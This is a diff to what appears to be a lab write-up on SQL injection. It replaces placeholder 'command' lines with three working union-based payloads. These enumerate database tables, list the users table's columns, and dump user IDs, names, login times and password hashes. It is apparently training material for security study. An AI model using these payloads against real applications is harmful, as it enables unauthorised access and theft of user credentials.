@@ -29,7 +29,7 @@ To be able to select the important information of the users, we follow the follo
 To see the tables, we used the following command
 
 ```
-command
+%' or 0=0 union select table_name, null from information_schema.tables #"
 ```
 
 the following result is obtained:
@@ -44,7 +44,7 @@ There are other tables of course but we just stopped the capture at this level f
 We used the following command to find the columns of the users table.
 
 ```
-command
+%' or 0=0 union select column_name, null from information_schema.columns where table_name = 'users' 
 ```
 
 Here is the result
@@ -60,7 +60,7 @@ We have chosen to retrieve the following fields: user_id, user, first_name, last
 Here is the query used 
 
 ```
-command
+%' or 0=0 union select 'user_id|user|first_name|last_name|last_login|password)', concat(user_id,'|',user, '|', first_name, '|', last_name, '|', last_login, '|', password) from users #
 ```
 
 And here is the result
